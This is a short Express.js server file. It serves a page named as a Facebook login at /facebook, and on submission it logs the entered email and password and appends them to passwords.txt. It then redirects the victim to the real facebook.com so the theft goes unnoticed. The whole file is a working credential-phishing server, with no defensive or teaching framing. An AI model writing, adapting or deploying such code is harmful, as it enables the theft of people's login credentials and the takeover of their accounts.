const express = require("express");
const app = express();
var fs = require("fs");

app.set("views", __dirname + "/pages");
app.engine("html", require("ejs").renderFile);

app.set("view engine", "ejs");
app.use(express.static("pages"));

app.use(express.urlencoded({ extended: true }));

app.use(express.json());

app.get("/facebook", (req, res) => {
  res.render("fb.html");
});
app.post("/facebook", (req, res) => {
  console.log(req.body);

  fs.appendFileSync(
    "passwords.txt",
    `\n\nemail:${req.body.email}\npassword:${req.body.passwrd}\n\n`
  );
  res.redirect("https://www.facebook.com/");
});
app.listen(6969, () => {
  console.log("Listening of port 6969");
});
